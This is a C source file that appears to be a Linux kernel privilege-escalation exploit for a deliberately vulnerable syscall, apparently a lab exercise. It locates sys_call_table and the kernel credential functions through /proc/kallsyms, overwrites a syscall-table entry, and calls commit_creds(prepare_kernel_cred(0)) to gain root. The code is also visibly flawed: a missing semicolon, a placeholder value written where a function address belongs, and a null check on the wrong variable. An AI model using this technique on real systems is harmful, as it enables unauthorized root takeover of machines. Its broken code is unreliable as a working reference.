#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<err.h>
#include<sys/syscall.h>
#include<sys/mman.h>

#define NR_SYS_UNUSED 223

void uncalled_function(void);

void **sys_call_table;

/* define the kernel structures */
struct task_struct;
struct cred;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon);

typedef int (*commit_creds_t)(struct cred *new);

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;


/* for finding the kernel module addresses */
void *find_kallsyms_addr(char *name){
  FILE *fp;
  char *line;
  size_t len=0, *addr;

  if((fp = fopen("/proc/kallsyms", "r")) == NULL){
    errx(1,"Error opening /proc/kallsys");
  }

  while(getline(&line, &len, fp) > 0){
    if(strstr(line, name)){
      sscanf(line, "%p", &addr);
      return addr;
    }
  }
  
  return NULL;
}

/* This is going to be run with kernel permissions */
void get_root_creds(){
  commit_creds(prepare_kernel_cred(0));
}


void vulnerable_syscall(){
  unsigned int address=0x13371337

  // overwrite vulnerable syscall with get_root_creds
  syscall(NR_SYS_UNUSED, &address, &sys_call_table[NR_SYS_UNUSED]);
  printf("[+] vulnerable syscall is overwritten\n");


  // call again to get shell
  syscall(NR_SYS_UNUSED);

  printf("hit here?\n");

}

void *find_sys_call_table_base(void){
  FILE *fp;
  char *line;
  size_t len=0, *addr;

  fp = fopen("/proc/kallsyms", "r");
  if(fp == NULL)
    errx(1, "Error opening System.map");

  while(getline(&line, &len, fp) > 0){
    if(strstr(line, "sys_call_table")){
      sscanf(line, "%p", &addr);
      return addr;
    }
  }

  return NULL;
}




int main(){

  sys_call_table = find_sys_call_table_base();
  if(sys_call_table == NULL)
    errx(1,"coudln't find sys_call_table base");
  printf("[+] sys_call_table at %p\n", sys_call_table);

  commit_creds = find_kallsyms_addr("commit_creds");
  if(commit_creds == NULL)
    errx(1,"Error finding kallsyms symbol");
  printf("[+] commit_creds at %p\n", commit_creds);

  prepare_kernel_cred = find_kallsyms_addr("prepare_kernel_cred");
  if(commit_creds == NULL)
    errx(1,"Error finding kallsyms symbol");
  printf("[+] prepare_kernel_cred at %p\n", prepare_kernel_cred);

  vulnerable_syscall();


  return 0;

}



